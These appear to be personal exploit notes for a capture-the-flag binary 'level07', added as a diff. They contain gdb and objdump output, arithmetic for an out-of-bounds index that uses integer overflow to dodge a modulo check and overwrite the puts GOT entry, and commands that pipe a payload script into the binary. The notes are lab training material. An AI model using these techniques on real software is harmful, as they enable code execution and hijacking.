@@ -1,0 +1,47 @@
+
+gdb -ex "set disassembly-flavor intel" -ex start -ex "b *0x080486d0" -ex continue ./level07
+    ->store
+    ->1337
+    ->33632948
+    :info registers
+        eax            0x804a014        134520852
+        ecx            0x20132b4        33632948
+        edx            0x539            1337
+        ebx            0xffffd544       -10940
+    :x/x 0x804a014
+        0x804a014 <puts@got.plt>:       0x00000539
+    :x/d 0x804a014
+        0x804a014 <puts@got.plt>:       1337
+
+objdump -d -Mintel level07
+    080484c0 <puts@plt>:
+     80484c0:	ff 25 14 a0 04 08    	jmp    DWORD PTR ds:0x804a014
+
+"""
+0xffffd544 + (i << 2) = target
+(10804a014 - 0xffffd544 = 0x804cad0) >> 2 = 0x20132b4 = 33632948
+
+0xffffd544 + (33632948 << 2) = 0x804a014
+"""
+
+"""
+i << 2 = x; x % 3 = 0 ; 0xffffd544 + x = 0xffffd544 + (i * 4)
+
+0x100000000 >> 2 = 0x40000000
+0x40000003 << 2 = 0xC;
+
+3 * 4 = 0xC;  0xffffd544 + 0xC = 0xffffd544 + (3 * 4) = 0xffffd544 + (0x40000003 * 4)
+
+"""
+
+0xffffd544 + 0x28 = 0xffffd56c
+
+python /tmp/injection.py > /tmp/sol7
+
+cat /tmp/sol7 - | ./level07
+
+./level07 < <(python /tmp/injection.py; cat)
+
+
+
+
